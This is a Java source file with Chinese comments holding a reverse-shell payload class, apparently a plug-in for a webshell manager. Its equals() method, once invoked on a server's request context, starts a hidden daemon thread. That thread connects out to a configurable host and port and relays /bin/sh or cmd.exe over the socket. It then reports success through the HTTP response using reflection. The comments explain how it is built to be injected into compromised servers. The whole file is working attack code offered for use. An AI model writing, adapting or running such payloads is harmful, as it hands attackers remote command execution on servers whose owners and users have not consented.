// 反弹 shell 载荷：回连 h:p 后挂 /bin/sh（或 cmd.exe），socket↔进程 双向中继。
// 一次性启动后台线程；回连失败即在响应中报错。约束：默认包、全反射回显、单 class、零跨类引用。
public class WsmReverse {

	public static final String h = "WSMR-H0"; // 回连主机
	public static final String p = "WSMR-P0"; // 回连端口

	public boolean equals(Object ctx) {
		String out;
		try {
			final String host = String.valueOf(h); // valueOf 屏障：防常量折叠生成脱离字段池条目的新字面量
			final int port = Integer.parseInt(String.valueOf(p));
			Thread t = new Thread(() -> reverseShell(host, port));
			t.setDaemon(true);
			t.start();
			// 等一小段确认回连是否建立（失败快速报错）
			Thread.sleep(600);
			out = "OK reverse " + host + ":" + port + " spawned /bin|cmd（若未上线检查监听端）";
		} catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	static void reverseShell(String host, int port) {
		java.net.Socket s = null;
		Process proc = null;
		try {
			s = new java.net.Socket();
			s.connect(new java.net.InetSocketAddress(host, port), 8000);
			String os = System.getProperty("os.name", "").toLowerCase();
			proc = new ProcessBuilder(os.contains("win") ? "cmd.exe" : "/bin/sh")
				.redirectErrorStream(true).start();
			final java.net.Socket sock = s;
			final Process pr = proc;
			Thread t1 = new Thread(() -> {
				try {
					java.io.InputStream in = sock.getInputStream();
					java.io.OutputStream out = pr.getOutputStream();
					byte[] b = new byte[4096];
					int n;
					while ((n = in.read(b)) != -1) { out.write(b, 0, n); out.flush(); }
				} catch (Throwable ignored) {}
				try { pr.destroy(); } catch (Throwable ignored2) {}
			});
			Thread t2 = new Thread(() -> {
				try {
					java.io.InputStream in = pr.getInputStream();
					java.io.OutputStream out = sock.getOutputStream();
					byte[] b = new byte[4096];
					int n;
					while ((n = in.read(b)) != -1) { out.write(b, 0, n); out.flush(); }
				} catch (Throwable ignored) {}
				try { sock.close(); } catch (Throwable ignored2) {}
			});
			t1.setDaemon(true); t2.setDaemon(true);
			t1.start(); t2.start();
			try { t1.join(); } catch (Throwable ignored) {}
			try { t2.join(); } catch (Throwable ignored) {}
		} catch (Throwable ignored) {
			try { if (s != null) s.close(); } catch (Throwable ignored2) {}
			try { if (proc != null) proc.destroy(); } catch (Throwable ignored2) {}
		}
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
